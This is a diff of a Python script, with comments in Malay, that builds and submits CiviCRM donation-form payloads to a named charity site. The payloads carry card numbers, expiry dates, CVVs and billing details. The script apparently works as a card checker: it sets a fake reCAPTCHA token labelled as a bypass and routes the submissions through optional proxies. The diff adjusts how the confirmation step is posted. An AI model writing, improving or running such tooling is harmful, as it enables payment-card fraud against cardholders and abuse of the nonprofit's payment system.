@@ -288,30 +288,14 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amoun
     final_payload["g-recaptcha-response"] = "03AGdBq25 FakeTokenCivicrmBypass1234567890"
 
     if is_confirm:
+        # BETUL 100% MCM PAYLOAD YANG AWAK BG
         final_payload["qfKey"] = new_qfkey if new_qfkey else qfkey
-        final_payload["entryURL"] = ""
+        final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
+        final_payload["email_work"] = ""
         final_payload["_qf_default"] = "Confirm:next"
-        final_payload["_qf_Confirm_next"] = "Confirm"
-        final_payload["email-5"] = user_data['email']
         final_payload["custom_1"] = full_year
-        final_payload["custom_2"] = ""
         final_payload["custom_3"] = ""
-        final_payload["priceSetId"] = "3"
-        final_payload["price_2"] = amount
-        final_payload["payment_processor_id"] = "4"
-        final_payload["credit_card_type"] = scheme
-        final_payload["credit_card_number"] = ccnum
-        final_payload["cvv2"] = cvv
-        final_payload["credit_card_exp_date[M]"] = str(input_month)
-        final_payload["credit_card_exp_date[Y]"] = full_year
-        final_payload["billing_first_name"] = user_data['first_name']
-        final_payload["billing_middle_name"] = user_data['middle_name']
-        final_payload["billing_last_name"] = user_data['last_name']
-        final_payload["billing_street_address-5"] = user_data['street_address']
-        final_payload["billing_city-5"] = user_data['city']
-        final_payload["billing_country_id-5"] = "1228"
-        final_payload["billing_state_province_id-5"] = user_data['state_id']
-        final_payload["billing_postal_code-5"] = user_data['postal_code']
+        final_payload["_qf_Confirm_next"] = "1"
     else:
         final_payload["qfKey"] = qfkey
         final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
@@ -411,8 +395,6 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 })
 
                 clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=True, new_qfkey=qfkey_to_use)
-                
-                # BETUL BALIK allow_redirects=True SUPAYA DIA BACA HTML RESPONSE
                 confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
                 
                 logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
